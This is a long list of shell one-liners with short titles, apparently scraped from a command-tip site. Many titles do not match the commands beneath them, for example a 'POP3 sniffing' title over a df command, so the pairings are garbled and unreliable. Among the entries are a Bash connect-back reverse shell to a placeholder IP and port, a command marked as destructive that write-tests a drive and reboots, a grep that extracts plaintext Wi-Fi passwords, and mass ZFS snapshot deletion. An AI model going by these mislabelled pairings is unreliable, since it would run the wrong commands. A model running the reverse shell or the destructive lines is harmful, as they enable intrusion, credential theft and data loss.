# Poor man's unsort (randomize lines)
while read l; do echo -e "$RANDOM\t$l"; done | sort -n | cut -f 2
# Function to remove a directory from your PATH
pathrm() { PATH=`echo $PATH | sed -e "s=^${1}:==;s=:${1}$==;s=:${1}:=:="`; }
# Use the builtin ':' bash command to increment variables
[ $V ] || : $((V++)) && echo $V
# Show a line when a "column" matchs
awk '{ FS = OFS = "#" } { if ($9==1234) print }' filename*.log > bigfile.log
# Sort files by date
ls -lrt
# Copy without overwriting
yes n | cp -p -i -r <src> <dest>
# Check SSH public and private keys matching
diff <(ssh-keygen -y -f ~/.ssh/id_rsa) <(cut -d' ' -f1,2 ~/.ssh/id_rsa.pub)
# List open TCP/UDP ports
lsof -i tcp -i udp
# keep an eye on system load changes
watch -n 7 -d 'uptime | sed s/.*users,//'
# Download a numbered sequence of files
grep -h -o '<[^/!?][^ >]*' * | sort -u | cut -c2-
# Capture data in ASCII. 1500 bytes
tcpdump -ieth0 -n tcp port 80 -A -s1500
# Test how well a web server handles concurrent connections and big load.
for i in *; do sum=$(md5sum $i); mv  -- "$i" "${sum%% *}"; done
# Monitor the queries being run by MySQL
mytop
# get absolute file path
readlink -f myfile.txt
# Generate a Change Log with git
git log --no-merges --format="%an: %s" v1..v2
# Hide or show Desktop Icons on MacOS
defaults write com.apple.finder CreateDesktop -bool false;killall Finder
# split a string (3)
OLD_IFS="$IFS"; IFS=: ARRAY=($PATH); echo ${ARRAY[2]}; IFS="$OLD_IFS"
# sort monthwise
sort -M filename
# Oneliner to run commands on multiple servers
sxh () { for i in "${@:2}"; do ssh "$i" "$1"; done ; }
# HTTP Get of a web page via proxy server with login credentials
curl -U username[:password] -x proxyserverIP:proxyserverPort webpageURI
# calculate in commandline with bash
echo $(( 1+1 ))
# wget with resume
wget -c   or wget --continue
# Install Restricted Multimedia Codecs in Ubuntu 14.04
echo "$math_expr" | bc -l
# Use QuickLook from the command line without verbose output
qlook() { qlmanage -p "$@" >& /dev/null & }
# print contents of file from line 1 until we match regex
sed -n '1,/regex/p' filename
# Show the key code for keyboard events include the Fn keys
sudo showkey -k
# nohup  that doesn't generate nohup.out
nohup <command> 2> /dev/null > /dev/null &
# Report bugs in Ubuntu
nslookup -q=txt <topic>.wp.dg.cx
# Run bash on top of a vi session (saved or not saved), run multiple commands, instead of one at a time with :!(bashcommand), type exit and [enter] to get back to where you left off in vi.
:shell
# Getting the ip address of eth0
ifconfig eth0 | awk '/inet addr/ {split ($2,A,":"); print A[2]}'
# send echo to socket network
echo foo | netcat 192.168.1.2 25
# mount a cdrom
mount -t iso9660 /dev/cdrom /media/cdrom
# Generate an XKCD #936 style 4 word password
echo $(grep "^[^']\{3,5\}$" /usr/share/dict/words|shuf -n4)
# Limit the transfer rate and size of data over a pipe
cat /dev/zero | pv -L 3m -Ss 100m > /dev/null
# Top 10 Memory Processes (reduced output to applications and %usage only)
ps aux | sort -rk 4,4 | head -n 10 | awk '{print $4,$11}'
# Copy text to the clipboard
cat SomeFile.txt | pbcopy
# preprocess code to be posted in comments on this site
composite -dissolve 30% -tile watermark.png input.png output.png
# Find Files That Exceed a Specified Size Limit
find directory -size +nnn
# get diskusage of files modified during the last n days
sudo find /var/log/ -mtime -7 -type f | xargs du -ch | tail -n1
# prints line numbers
ls | sed "/^/=" | sed "N;s/\n/. /"
# Ease your directory exploration
tt(){tree -pFCfa . | grep "$1" | less -RgIKNs -P "H >>> "}
# Randomize lines (opposite of | sort)
sort -R
# password recovery on debian
init=/bin/bash; mount -o remount,rw /
# quick and dirty formatting for HTML code
sed -r 's_(/[^>]*?>)_\1\n_g' filename.html
# Display your ${PATH}, one directory per line
echo $PATH | tr : \\n
# import gpg key from the web
head -c4 /dev/urandom | od -N4 -tu4 | sed -ne '1s/.* //p'
# bash alias for sdiff: differ
alias differ='sdiff --suppress-common-lines'
# Deal with dot files safely
rm -r .[!.]*
# What is my public IP address
GET checkip.dyndns.org
# How to stop MAC Address via IPTables
-A INPUT -i eth1 -m mac ?mac 00:BB:77:22:33:AA -j ACCEPT
# Tells you where a command is in your $PATH, but also wether it's a link and to what.
ls -l `which foo`
# Format date/time string for a different day
date --date=yesterday +%Y%m%d
# Clear the terminal screen
clear
# Convert any sequence of spaces/tabs to single space/tab
tr -s ' \t' <1.txt >2.txt
# Drop or block attackers IP with null routes
sudo route add xxx.xxx.xxx.xxx gw 127.0.0.1 lo
# Create a random password encrypted with md5 with custom lenght
echo -n $mypass | md5sum | awk {'print $1'}
# 1+2-3+4-5+6-7 Series
seq 1000 | paste -sd+- | bc
# Find directory depth
find . -printf '%d\n' | sort -n  | tail -1
# 1:1 copy of a volume
find / -xdev -print | cpio -pdmuv /mnt/mydisk
# tcmdump check ping
tcpdump -nni eth0 -e icmp[icmptype] == 8
# Show the command line for a PID, converting nulls to spaces and a newline
tr '\0' ' ' </proc/21679/cmdline ; echo
# du and sort to find the biggest directories in defined filesystem
du -x / | sort -rn | less
# List subfolders from largest to smallest with sizes in human readable form
du -hd1 | sort -hr
# Forwards connections to your port 2000 to the port 22 of a remote host via ssh tunnel
ssh -NL 2000:remotehost:22 remotehost
# Geolocate a given IP address
geoiplookup <ipadress>
# simple port check command
parallel 'nc -z -v {1} {2}' ::: 192.168.1.10 192.168.1.11 ::: 80 25 110
# %s across multiple files with Vim
:set nomore   :argdo %s/foo/bar/g | update
# List contents of jar
jar -tf file.jar
# Selecting a random file/folder of a folder
ls -1 | shuf -n 1
# Position the cursor under the current directory line
PS1="${PS1::-3} \n$ "
# Validate date, also a date within a leap year
date -d2009-05-18 > /dev/null 2>&1 ; echo $?
# Setting reserved blocks percentage to  1%
sudo apt-get install linux-headers-`uname -r`
# Signals list by NUMBER and NAME
i=0;for s in `fuser -l`;do echo $((i++)) $s;done
# Retrieve the size of a file on a server
curl -s "$URL" |wc -c
# Remove text from file1 which is in file2 and stores it in an other file
grep -Fvf file1 file2 > file-new
# convert ascii string to hex
python -c 'print "hello".encode("hex")'
# Get line count for any file ending with extension recursively rooted at the current directory.
find . -name "*.py" | xargs wc -l
# Concatenates lines using sed
sed -e :a -e '/$/N;s/\n/ /;ta' <filename>
# convert flac to mp3
flac -cd input.flac |lame -h - output.mp3
# Vlc ncurses mode browsing local directorys.
vlc -I ncurses <MEDIA_DIR>
# Shows what processes need to be restarted after system upgrade
checkrestart
# backup your history
history > ~/history-save-$(date +%d-%m-%y-%T)
# list only directories in reverse order
ls -ltrhd */
# Email HTML content
mailx bar@foo.com -s "HTML Hello" -a "Content-Type: text/html" < body.htm
# Increase SCT of external USB disk enclosure to one hour.
sdparm -s SCT=36000 --save /dev/sdb
# A sorted summary of disk usage including hidden files and folders
du -hs .[^.]* * | sort -h
# Display information sent by browser
nc -l 8000
# Get info on RAM Slots and Max RAM.
tr -c -d 0-9 < /dev/urandom | head -c 10
# determine if tcp port is open
if (nc -zw2 www.example.com 80); then echo open; fi
# How to get an absolute value
abs_value=-1234; echo ${abs_value#-}
# find duplicate processes
ps aux | sort --key=11 | uniq -c -d --skip-fields=10 | sort -nr --key=1,1
# Preview of a picture in a terminal
img test.jpg
# graphical memory usage
smem --pie name -s pss
# Prints line numbers
grep -n "^" <filename>
# Lvextend logical volume
lvextend -r -L+100G /dev/VG/LV
# GIT: list unpushed commits
git log --oneline <REMOTE>..<LOCAL BRANCH>
# Replace multiple spaces with semicolon
sed "s/\s\+/;/g;s/^ //;s/ $//" filename.csv
# Null a file with sudo
sudo bash -c "> /var/log/httpd/access_log"
# Calculate N!
echo $(( $(echo 1 "* "{2..10}) ))
# Both view and pipe the file without saving to disk
cat /path/to/some/file.txt | tee /dev/pts/0 | wc -l
# delete multiple files from git index that have already been deleted from disk
git status | grep deleted | awk '{print $3}' | xargs git rm
# Fetch the Gateway Ip Address
ip route list match 0.0.0.0/0 | cut -d " " -f 3
# post data with a http request
curl -d "a1=v1&a2=v2" url
# Find out current working directory of a process
echo COMMAND | xargs -ixxx ps -C xxx -o pid= | xargs -ixxx ls -l /proc/xxx/cwd
# Your name backwards
sed -i 's/OLD/NEW/g' FILE
# clear all non-ascii chars of file.txt
iconv -c -f utf-8 -t ascii file.txt
# Replicate a directory structure dropping the files
find . -type d -print0 | (cd $DESTDIR; xargs -0 mkdir)
# Directory Tree
tree -d
# echo unicode characters
echo -e \\u2620
# Sniff ONLY POP3 authentication by intercepting the USER command
df -h | grep -v ^none | ( read header ; echo "$header" ; sort -rn -k 5)
# Move a folder and merge it with another folder
gcp -r -l source/ destination/
# See n most used commands in your bash history
sort ~/.bash_history|uniq -c|sort -n|tail -n 10
# Get lines count of a list of files
find . -name "*.sql" -print0 | wc -l --files0-from=-
# Recursively remove Mac . (dot) files
find . -name '._*' -type f -delete
# Export a directory to all clients via NFSv4, read/write.
exportfs -o fsid=0,rw :/home/jason
# See a full list of compiler defined symbols
gcc -dM -E - < /dev/null
# command shell generate random strong password
len=20; tr -dc A-Za-z0-9_ < /dev/urandom | head -c ${len} | xargs
# Find out how much ram memory has your video (graphic) card
glxinfo |grep -i -o 'device|memory\|[0-9]\{1,12\} MB'|head -n 1
# A snooze button for xmms2 alarm clock
xmms2 pause && echo "xmms2 play" | at now +5min
# Prevent overwriting file when using redirection
set -o noclobber
# Get the time since epoch
date +%s
# Clean your broken terminal
reset
# send a file or directory via ssh compressing with lzma for low trafic
tar -cf - ./file | lzma -c | ssh user@sshserver $(cd /tmp; tar --lzma -xf -)
# user 'tr' to convert mixed case in a file to lower case
tr "[:upper:]" "[:lower:]" < file
# Find C/C++ source files
find . -name '*.[c|h]pp' -o -name '*.[ch]' -type f
# Colored cal output
alias cal='cal | grep --color=auto -E "( |^)$(date +%e)|$"'
# Restore deleted file from GIT repository
git checkout $(git rev-list -n 1 HEAD -- "$file")^ -- "$file"
# history manipulation
!-2 && !-1
# Convert a string to "Title Case"
echo 'This is a TEST' | sed 's/[^ ]\+/\L\u&/g'
# old man's advice
fortune | toilet -w $(($(tput cols)-5)) -f pagga | cowsay -n -f beavis.zen
# Show your current network interface in use
route | grep -m1 ^default | awk '{print $NF}'
# Find biggest 10 files in current and subdirectories and sort by file size
find . -type f -print0 | xargs -0 du -h | sort -hr | head
# Calculate 1**2 + 2**2 + 3**2 + ...
seq -f"%g^2" -s "+" 10 | bc
# Shows the torrent file name along with the trackers url
find . -name '*.?pp' | xargs grep -H "string"
# Generate trigonometric/log data easily
echo "e("{1..8}");" | bc -l
# get you public ip address
export HISTFILESIZE=99999
# Backup VPS disk to another host
ssh root@vps.example -p22 "cat /dev/sda1 | gzip -1 - " > vps.sda1.img.gz
# List all the files that have been deleted while they were still open.
lsof | egrep "^COMMAND|deleted"
# Determine space taken by files of certain type
find . -name <pattern> -ls | awk 'BEGIN {i=0}; {i=i+$7}; END {print i}'
# save your current environment as a bunch of defaults
env | sed 's/\(.*\)=\(.*\)/: ${\1:="\2"}/'  > mydefaults.bash
# Double your disk read performance in a single command
blockdev --setra 1024 /dev/sdb
# force unsupported i386 commands to work on amd64
sed 's/^M$//' input.txt > output.txt
# Create and access directory at the same time
mkdir [folder-name] && cd $_
# Show (only) list of files changed by commit
git show --relative --pretty=format:'' --name-only HASH
# format txt as table
cat /etc/passwd | column -nts:
# Link a deep tree of files all into on directory
find /deep/tree/ -type f -print0|xargs -0 -n1 -I{} ln -s '{}' .
# listen to ram
cat /dev/mem > /dev/audio
# Get a list of ssh servers on the local subnet
nmap -p 22 10.3.1.1/16 | grep -B 4 "open"
# add a ip address to a network device
ip addr add 192.168.10.1/24 dev eth0
# get a process list by listen port
netstat -ntlp | grep -w 80 | awk '{print $7}' | cut -d/ -f1
# list block level layout
lsblk
# Change to $HOME - zsh, bash4
~
# remove oprhan package on debian based system
sudo deborphan | xargs sudo apt-get -y remove --purge
# Print all fields in a file/output from field N to the end of the line
cut -f N- file.dat
# Collect a lot of icons from /usr/share/icons (may overwrite some, and complain a bit)
mkdir myicons && find /usr/share/icons/ -type f | xargs cp -t myicons
# List directories sorted by (human readable) size
du -h --time --max-depth=1 | sort -hr
# use SHIFT + ALT to toggle between two keyboard layouts
setxkbmap -option grp:switch,grp:alt_shift_toggle,grp_led:scroll us,es
# Backup entire directory using rsync
rsync -avzhP <[[user@]host1:]directory1> <[[user@]host2:]directory2>
# drop first column of output by piping to this
awk '{for(i=2;i<=NF;i++) printf("%s%s",$i,(i!=NF)?OFS:ORS)}'
# Simple complete system backup excluding files or directories
tar zcpf backup.tgz --exclude=/proc --exclude=backup.tgz /
# Reinstall Grub
sudo grub-install --recheck /dev/sda1
# Multi-thread any command
xargs -P 3 -n 1 <COMMAND> < <FILE_LIST>
# Lists the size of certain file in every 10 seconds
watch -n 10 'du -sk testfile'
# get stdout to variable and stdout at sametime
{ var="$( ls / | tee >(cat - >&2) )"; } 2>&1; echo -e "*** var=$var"
# finds the c files with lines containing 'mcs', in the folders under the current folder
find */*.c | xargs grep 'mcs'
# Print the last modified file
ls -t1 | head -n1
# Monitor RX/TX packets and any subsquent errors
watch 'netstat -aniv'
# Watch active calls on an Asterisk PBX
watch "asterisk -vvvvvrx 'core show channels' | egrep \"(call|channel)\""
# Put terminal into vi mode
set -o vi
# Restart X11 with HUP signal
kill HUP `pidof '/usr/bin/X'`
# Shell function to create a menu of items which may be inserted into the X paste buffer.
smenu() ( IFS=',' ; select x in $*; do echo "$x" | xsel -i; done )
# scheduled jobs
at <date> < jobs.sh
# Edit 2 or more files in vim using vim -d
vim -d '+diffoff!' file1 file2
# Count Files in a Directory with Wildcards.
find /dir/to/serach -maxdepth 1 -name "foo*.jpg"|wc -l
# List only hidden files
ls -d .??*
# View disk usage
du -hL --max-depth=1
# GZip all files in a directory separately
gzip *
# Synchronize date and time with a server over ssh
date +%Y%m%d%T -s "`ssh user@server 'date "+%Y%m%d %T"'`"
# Send e-mail if host is 'dead' or not reachable
10,30,50 * * * * ping -c1 -w3 192.168.0.14 >/dev/null
# strace like SystemTap script
stap -v strace.stp -c /path/to/command
# Download SSL server certificate with opsnessl
openssl s_client -connect www.example.com:443 > /tmp/example.com.cert
# Move cursor to end of line
Ctrl + e
# PRINT LINE the width of screen or specified using any char including Colors, Escapes and metachars
L(){ l=`builtin printf %${2:-$COLUMNS}s` && echo -e "${l// /${1:-=}}"; }
# fdiff is a 'filtered diff'. Given a text filter and two inputs, will run the filter across the input files and diff the output.
fdiff() { ${DIFFCMD:-diff} <( $1 $2 ) <( $1 $3 ); }
# Exclude a string with awk
awk '{sub("String","")}1'
# floating point operations in shell scripts
echo "5 k 3 5 / p" | dc
# Insert a line for each n lines
ls -l | sed "$(while (( ++i < 5 )); do echo "N;"; done) a -- COMMIT --"
# Save a file you edited in vim without the needed permissions
:%!sudo tee %
# Show sections of a man page.
man ls | egrep "^([A-Z]|   [A-Z])"
# Embed next line on the end of current line using sed
sed  'X{N;s/\n//;}' file.txt (where X is the current line)
# Kill multiple instances of a running process
killall -9 rouge-process
# Remove specific entries from iptables
iptables -L INPUT --line-numbers
# Show a git log with offsets relative to HEAD
git log --oneline | nl -v0 | sed 's/^ \+/&HEAD~/'
# sort ugly text
sort -bdf
# git diff of files that have been staged ie 'git add'ed
git diff --cached
# Update a tarball
tar -tf file.tar | tar -T - -uf file.tar
# Trim linebreaks
cat myfile.txt | tr -d '\n'
# Track X Window events in chosen window
ls -l | awk '{if (NR % 5 == 0) print "-- COMMIT --"; print}'
# cpu info
:%v/./,/./-j
# Send a local file via email
cat filename | mail -s "Email subject" user@example.com
# Display condensed log  in a tree-like format.
git log --graph --pretty=oneline --decorate
# lotto generator
echo $(shuf -n 6 -i 1-49 | sort -n)
# Find number of computers in domain, OU, etc .
dsquery computer DC=example,DC=com -limit 150 | find /c /v ""
# Filter the output of a file continously using tail and grep
tail -f $FILENAME | grep --line-buffered $PATTERN
# Replace spaces in a filename with hyphens
rename 's/ /-/g' *
# Delete all files older than X in given path
find . -mtime +10 -delete
# Work out numerical last month
LASTMONTHNUM=`date -d "last month" +%m`
# Create a file of a given size in linux
dd if=/dev/zero of=sparse_file bs=1024 skip=1024 count=1
# Read funny developer comments in the Linux source tree
grep -2riP '\b(fuck|shit|bitch|tits|ass\b)' /usr/src/linux/
# Alias TAIL for automatic smart output
alias tail='tail -n $((${LINES:-`tput lines 2>/dev/null||echo -n 80`} - 7))'
# reduce mp3 bitrate (and size, of course)
lame --mp3input -m m --resample 24 input.mp3
# Show your local ipv4 IP
ip -o -4 a s | awk -F'[ /]+' '$2!~/lo/{print $4}'
# Check if filesystem hangs
ls /mnt/badfs &
# convert a line to a space
echo $(cat file)
# List every file that has ever existed in a git repository
git log --all --pretty=format:" " --name-only | sort -u
# remove newlines from specific lines in a file using sed
sed -i '/pattern/N; s/\n//' filename
# Summary of disk usage, excluding other filesystems, summarised and sorted by size
du -xks * | sort -n
# Show every subdirectory (zsh)
ls -ld **/*(/)
# Top ten memory hogs
ps -eorss,args | sort -nr | pr -TW$COLUMNS | head
# Connect-back shell using Bash built-ins
bash -i >& /dev/tcp/IP/PORT 0>&1
# View internet connection activity in a browser
lsof -nPi | txt2html  > ~/lsof.html
# Get free RAM in %
free -m | awk '/cache:/ { printf("%d%\n",$3/($3+$4)*100)}'
# Getting GnuPG Public Keys From KeyServer
gpg --keyserver pgp.surfnet.nl --recv-key 19886493
# create a backup for all directories from current dir
find -maxdepth 1 -type d -print0 | xargs -0 -I {} tar -cvzf {}.tar.gz {}
# Recover deleted Binary files
sudo foremost -i /dev/sda -o /recovery
# Continue a current job in the background
%1 &!
# quick integer CPU benchmark
echo '2^2^20' | time bc > /dev/null
# Edit 2 or more files in vim using vim -d
vim -O file1 file2
# Dump a configuration file without comments or whitespace...
grep -v "\ *#\|^$" /etc/path/to.config
# Length of longest line of code
awk '(length>t) {t=length} END {print t}' *.cpp
# Get the date for the last Saturday of a given month
cal 04 2012 | awk '{ $7 && X=$7 } END { print X }'
# Replace "space" char with "dot" char in current directory file names
ls -1 | while read a; do mv "$a" `echo $a | sed -e 's/\ /\./g'`; done
# Dump snapshot of UFS2 filesystem, then gzip it
dump -0Lauf - /dev/adXsYz | gzip > /path/to/adXsYz.dump.gz
# shell function which allows you to tag files by creating symbolic links directories in a 'tags' folder.
tag() { local t="$HOME/tags/$1"; [ -d $t ] || mkdir -p $t; shift; ln $* $t;}
# disable caps lock
PROMPT_COMMAND='seq $COLUMNS | xargs -IX printf "%Xs\r" @'
# Get length of current playlist in xmms2
xmms2 list | grep '^\s\+\[' | wc -l
# ttyS0 - terminal on serial connection
setserial -q /dev/ttyS0
# edit hex mode in vim
:%!xxd
# Awesomeness Confirmation Bias
iamawesome=$(curl -LsS iamawesome.com | echo -e "\n\n$(cat) \n\n");
# Clean up after a poorly-formed tar file
tar ztf tar-lacking-subdirectory.tar.gz | xargs rm
# Function to output an ASCII character given its decimal equivalent
chr() { printf \\$(printf %o $1); }
# "What the hell is running on?!" Easily snoop your system's RAM consumption
ps aux | awk '$11!~/\[*\]/ {print $6/1024" Mb --> "$11,$12,$13,$14}' | sort -g
# ping with timestamp
ping HOSTNAME | while read pong; do echo "$(date): $pong"; done
# View a man page on a nice interface
yelp man:foo
# Rename a file with a random name
rf() { for i in "$@"; do mv "$i" "$(pwgen 8 1).${i##*.}"; done }
# Touch a file using a timestamp embedded in the file name.
tstouch() { [[ $1 =~ $2 ]] && touch -t ${BASH_REMATCH[1]} $1; }
# Top 10 Memory Consuming Processes
ps -auxf | sort -nr -k 4 | head -10
# Monitor cpu in realtime.
watch grep \"cpu MHz\" /proc/cpuinfo
# Get My Public IP Address
watch -n1 'ifconfig eth0|grep bytes'
# cd into the latest directory
alias cd1='cd $( ls -lt | grep ^d | head -1 |  cut -b 51- )'
# Invert selection with find.
find . ! -name "*.tar.gz"
# Remove audio stream from a media file
echo -e "swap=me\n1=2"|sed 's/\(.*\)=\(.*\)/\2=\1/g'
# Returns the number of cores in a linux machine.
grep -c ^processor /proc/cpuinfo
# Find Out My Linux Distribution Name and Version
lsb_release -ri
# Get playlist for Livestream on YouTube
youtube-dl --list-formats <URL>; youtube-dl -f <STREAM_ID> -g <URL>
# Find which service was used by which port number
getent services <port_number>
# Start vim without initialization
vim -u NONE yourfile
# peak amount of memory occupied by any process with "FOO" in its name
grep VmHWM /proc/$(pgrep -d '/status /proc/' FOO)/status
# Remove duplicate lines whilst keeping empty lines and order
awk '!NF || !seen[$0]++'
# This will take the last two commands from bash_history and  open your editor with the commands on separated lines
fc -1 -2
# Label EXT2/EXT3 File System
renice 19 -p $$
# hanukkah colored bash prompt
export PS1="\e[0;34m[\u\e[0;34m@\h[\e[0;33m\w\e[0m\e[0m\e[0;34m]#\e[0m "
# Show LAN IP with ip(8)
ip route show dev eth0 | awk '{print $7}'
# python2 -m CGIHTTPServer
starts a CGI web server
# Check if a command is available in your system
type {command} >/dev/null
# Execute a command with a timeout
timeout -k 1m 30s some_command
# fork performance test
while (true); do date --utc; done | uniq -c
# Get all links from commandlinefu front page
date --utc --date "2009-02-06 09:57:54" +%s
# Make info pages much less painful
pinfo date
# Mount/unmount your truecrypted file containers
truecrypt volume.tc
# Analyse writing style of writing style of a document
style TEXT-FILE
# convert single digit to double digits
convert label:"$(ifconfig)" output.png
# paste one file at a time instead of in parallel
paste --serial file1 file2 file3
# Write a listing of all directories and files on the computer to a compressed file.
sudo ls -RFal / | gzip > all_files_list.txt.gz
# concatenate compressed and uncompressed logs
zgrep -h "" `ls -tr access.log*`
# Adding a startup script to be run at bootup Ubuntu
sudo update-rc.d <scriptname> defaults
# draw line separator
seq -s '*' 40|tr -c '*' '*' && echo
# Convert CSV to JSON with miller
mlr --c2j --jlistwrap cat file.csv
# Freshening up RKhunter
rkhunter --versioncheck --update --propupd --check
# underscore to camelcase
echo "this_is_a_test" | sed -r 's/_([a-z])/\U\1/g'
# create a simple version of ls with extended output
alias l='ls -CFlash'
# Remove an IP address ban that has been errantly blacklisted by denyhosts
denyhosts-remove $IP_ADDRESS
# C function manual
alias man='man -S 2:3:1'
# detect partitions
blkid -c /dev/null
# draw line separator (using knoppix5 idea)
printf '*%.s' {1..40}; echo
# auto terminal title change
echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD}\007"
# Update your journal
vi ~/journal/$(date +%F)
# Clear history
history -c
# Remove all the files except abc in the directory
rm ^'name with spaces'
# identify exported sonames in a path
scanelf --nobanner --recursive --quiet --soname --format "+S#f"
# Get version of loaded kernel module
lsmod | grep -io MODULENAME| xargs modinfo | grep -iw version
# Test sendmail
echo "Subject: test" | /usr/lib/sendmail -v me@domain.com
# get total of inodes of root partition
du --total --inodes / | egrep 'total$'
# Then end of the UNIX epoch
date -d @$(echo $((2 ** 31 - 1)))
# find out which directory uses most inodes - list total sum of directoryname existing on filesystem
find /etc -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n
# Identify all amazon cloudformation scripts recursively using ripgrep
rg -l "AWSTemplateFormatVersion: '2010-09-09'" *
# change ownership en masse of files owned by a specific user, including files and directories with spaces
find . -uid 0 -print0 | xargs -0 chown foo:foo
# Lists all usernames in alphabetical order
getent passwd | cut -d: -f1 | sort
# Grep all non-ascii character in file
grep --color='auto' -P -n '[^\x00-\x7F]' my_file.txt
# Transfer Entire recursive from one host to another. Only copies files that are newer or do not exist
rsync -azE -e "ssh -pPortnumber" src_dir user@hostB:dest_dir
# cat stdout of multiple commands
( command1 arg arg ; command2 arg ) ...
# vi show line numbers
:set nu
# create ext4 filesystem with big count of inodes
mkfs.ext4 -T news /dev/sdcXX
# get some information about the parent process from a given process
ps -o ppid= <given pid> | xargs ps -p
# Run command from another user and return to current
su - $user -c <command>
# Count lines using wc.
wc -l file.txt
# Re-read partition table on specified device without rebooting system (here /dev/sda).
partprobe
# move up through directories faster (set in your /etc/profile or .bash_profile)
function up { for i in `seq 1 $1`; do cd ../ && pwd; done }
# Generate a random text color in bash
echo -e "\e[3$(( $RANDOM * 6 / 32767 + 1 ))mHello World!"
# Show OS release incl version.
grep -m1 -h [0-9] /etc/{*elease,issue} 2>/dev/null | head -1
# Floating point power p of x
bc -l <<< "x=2; p=0.5; e(l(x)*p)"
# Find the 10 users that take up the most disk space
sudo -s du -sm /Users/* | sort -nr | head -n 10
# Capitalize the first letter of every word
sed "s/\b\(.\)/\u\1/g"
# Destroy all ZFS snapshots
zfs list -H -o name -t snapshot | xargs -n1 -t zfs destroy
# Sort content of a directory including hidden files.
du -sch .[!.]* * |sort -h
# Sort by IP address
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4
# Quickly generate an MD5 hash for a text string using OpenSSL
md5sum<<<'text to be encrypted'
# Open Sublime-text in current directory
subl $(pwd)
# Count number of bytes that are different between 2 binary files
cmp -l file1.bin file2.bin | wc -l
# Generate Random Text based on Length
genRandomText() { tr -cd '[:alpha:]' < /dev/urandom | head -c "$1"; }
# Produce 10 copies of the same string
echo boo{,,,,,,,,,,}
# SHA256 signature sum check of file
openssl dgst -sha256  <FILENAME>
# Get all IPs via ifconfig
ifconfig | awk '/ddr:[0-9]/ {sub(/addr:/, ""); print $2}'
# move you up one directory quickly
alias b='cd ../'
# Chrome sucks
ps aux | awk '/chrome/ {s+=$6}END{print s/1024}';
# Get last sleep time on a Mac
sysctl -a | grep sleeptime
# camelcase to underscore
echo thisIsATest | sed -r 's/([A-Z])/_\L\1/g'
# Start a local web server in the current directory on a random dynamic port.
python3 -m http.server --bind localhost $(shuf -i 49152-65000 -n1)
# Check for Firewall Blockage.
iptables -L -n --line-numbers | grep xx.xx.xx.xx
# Copy files and directories from a remote machine to the local machine
ssh user@host "(cd /path/to/remote/top/dir ; tar cvf - ./*)" | tar xvf -
# A DESTRUCTIVE command to render a drive unbootable
badblocks -vfw /dev/fd0 10000 ; reboot
# Show sorted list of files with sizes more than 1MB in the current dir
ls -l | awk '$5 > 1000000' | sort -k5n
# print all characters of a file using hexdump
od -c <file>
# clone a hard drive to a remote directory via ssh tunnel, and compressing the image
# dd if=/dev/sda | gzip -c | ssh user@ip 'dd of=/mnt/backups/sda.dd'
# Find all dot files and directories
printf "%s\n" .*
# Count threads of a jvm process
ps uH p <PID_OF_U_PROCESS> | wc -l
# Git diff last two commits
git diff HEAD^ HEAD
# Print the contents of $VARIABLE, six words at a time
echo $VARIABLE | xargs -d'\40' -n 6 echo
# Save the current directory without leaving it
pushd .
# List only directories, one per line
find * -type d -maxdepth 0
# Batch Convert SVG to PNG (in parallel)
parallel convert {} {.}.png ::: *.svg
# Rename all files in lower case
for f in `find`; do mv -v "$f" "`echo $f | tr '[A-Z]' '[a-z]'`"; done
# Recurse through directories easily
find . -type f | while read file; do cp $file ${file}.bak; done
# pimp text output e.g. "Linux rocks!" to look nice
cowsay Linux rocks!
# Get a process's pid by supplying its name
pidof () { ps acx | egrep -i $@ | awk '{print $1}'; }
# Show a config file without comments
sed -e 's/#.*//;/^\s*$/d'
# List the most recent dates in reverse-chronological order
echo {-1..-5}days | xargs -n1 date +"%Y-%m-%d" -d
# Find passwords that has been stored as plain text in NetworkManager
grep -H '^psk=' /etc/NetworkManager/system-connections/*
# cp the file
cp /some/path/to/myfile{,.back}
# Convert from octal format to umask
perm=( 6 4 4 ) ; for elem in ${perm[@]}; do echo `expr 7 - $elem` ; done
# return external ip
curl inet-ip.info
# Watch how many tcp connections there are per state every two seconds.
watch -c "netstat -nt | awk 'FNR > 3 {print \$6}' | sort | uniq -c"
# Print the detailed statistics of transferred bytes by the firewall rules
sudo iptables -L -nv
# Generate a random password 30 characters long
tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1
# Remove job from crontab by commandline
crontab -l -u USER | grep -v 'YOUR JOB COMMAND or PATTERN' | crontab -u USER -
# Explanation of system and MySQL error codes
perror NUMBER
# Skip banner on ssh login prompt
ssh -q user@server
# Alias to securely run X from tty and close that tty afterwards.
grep --color -E 'pattern|' file
# find filenames and directory names that doesn't conform ISO 9660 level 2
find . -regextype posix-extended -not -regex '.*/[A-Za-z_]*([.][A-Za-z_]*)?'
# shutdown if wget exit
while pgrep wget || sudo shutdown -P now; do sleep 1m; done
# list files by testing the ownership
find . -user root
# TCP and UDP listening sockets
netstat -t -u -l
# makes screen your default shell without breaking SCP or SFTP
[ "$TERM" != "dumb" ] && [ -z "$STY" ] && screen -dR
# automatically ditch old versions in a conflict
qq/<<<<<<^Md/^======^Mdd/>>>>>>^Mdd^M/<<<<<<q
# List all files/folders in working directory with their total size in Megabytes
du --max-depth=1 -m
# Remote Serial connection redirected over network using SSH
remserial -d -p 23000 -s "115200 raw" /dev/ttyS0 &
# Get current logged in users shortname
stat -f%Su /dev/console
# copy paste multiple binary files
tar -c bins/ | gzip -9 | openssl enc -base64
# Restrict the use of dmesg for current user/session
sudo sh -c 'echo 1 > /proc/sys/kernel/dmesg_restrict'
# Join lines and separate with spaces
tr -d '\r' < vmargs.txt | tr '\n' ' '
# resize(1/2) the image using imagemagick
convert -resize 50%x50% image{,_resize}.jpg
# Rename files to be all in CAPITALS
for n in * ; do mv $n `echo $n | tr '[:lower:]' '[:upper:]'`; done
# Create the directoty recursively
mkdir  /home/dhinesh/dir1/{dir2,dir3,dir4}/file1.txt -p
# Show bz compressed PF binary log
bzcat ext_if.log.0.bz2 | tcpdump -n -e -tttt -r - | less
# Get last sleep time on a Mac
sysctl kern.sleeptime
# List all directories only.
for d in */;{ echo $d; }
# processes per user counter
pgrep -cu ioggstream
# print a cpu of a process
ps -eo %cpu,args | grep -m1 PROCESS | awk '{print $1}'
# Resolution of a image
identify -format "%[fx:w]x%[fx:h]" logo:
# List bash functions defined in .bash_profile or .bashrc
set | fgrep " ()"
# Recursive Line Count
find * -type f -not -name ".*" | xargs wc -l
# Print only the odd lines of a file
awk 'NR%2'
# Test a SSLv2 connection
openssl s_client -connect localhost:443 -ssl2
# List only directories, one per line
